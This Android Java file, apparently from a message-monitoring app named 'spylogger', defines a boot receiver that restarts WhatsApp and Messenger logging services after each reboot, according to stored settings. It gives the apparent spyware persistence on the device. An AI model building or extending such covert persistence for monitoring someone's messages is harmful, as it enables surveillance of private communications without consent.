package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
import com.gravatasufoca.spylogger.services.MessengerService;
import com.gravatasufoca.spylogger.services.WhatsAppService;

import java.sql.SQLException;


public class BootStarter extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {

		try {
			RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);

			Configuracao configuracao= repositorioConfiguracao.getConfiguracao();
			boolean check=false;
			if(configuracao.isWhatsApp()){
				Intent myIntent = new Intent(context, WhatsAppService.class);
				context.startService(myIntent);
				check=true;
			}

			if(configuracao.isFacebook()){
				Intent myIntent = new Intent(context, MessengerService.class);
				context.startService(myIntent);
				check=true;
			}



		} catch (SQLException e) {
			e.printStackTrace();
		}

	}
}